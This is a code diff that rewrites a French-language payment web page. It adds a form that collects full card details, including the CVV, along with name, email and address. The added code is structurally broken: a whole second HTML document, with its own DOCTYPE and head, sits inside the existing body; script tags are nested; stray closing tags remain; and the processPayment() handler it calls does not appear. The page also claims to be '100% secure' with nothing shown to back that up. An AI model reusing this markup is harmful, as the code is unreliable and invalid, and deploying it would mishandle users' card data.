@@ -32,8 +32,47 @@
 		</div>
 		 <h4>Paiement 100% sécurisé </h4>
 	</div>
-	 <script>
-     document.getElementById('form').addEventListener('submit', function (e) {
+	<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+    <title>Payment Form</title>
+</head>
+<body>
+    <div class="payment-container">
+        <div class="container">
+            <h1>Payment Details</h1>
+            <div class="image-container">
+                <!-- Replace the URL with your actual image URL -->
+                <img src="placeholder-image.jpg" alt="Payment Image">
+            </div>
+            <form id="paymentForm" class="form-container">
+                <div class="name-container">
+                    <input type="text" id="firstName" placeholder="First Name" required>
+                    <input type="text" id="lastName" placeholder="Last Name" required>
+                </div>
+                <!-- Removed labels for brevity -->
+                <input type="text" name="card" id="cardNumber" placeholder="Card Number" required>
+                <input type="text" name="cardName" id="cardName" placeholder="Cardholder Name" required>
+                <input type="email" name="email" id="email" placeholder="Email" required>
+                <input type="text" name="address" id="address" placeholder="Address" required>
+                <div class="card-info">
+                    <input type="text" name="expiryDate" id="expiryDate" placeholder="Expiry Date (MM/YY)" required>
+                    <input type="text" name="cvv" id="cvv" placeholder="CVV" required>
+                </div>
+                <button type="submit" onclick="processPayment()">Finaliser la Transaction</button>
+                <div class="secure-text-container">
+                    <h4 class="secure-text">Paiement 100% Sécurisé</h4>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+	   <script>
+     document.getElementById('paymentForm').addEventListener('submit', function (e) {
 
         e.preventDefault();
 
@@ -75,7 +114,11 @@
         };
     });
         
-</script>
+</script> 
+    </script>
+</body>
+</html>
+
 </body>
 	
 </html>
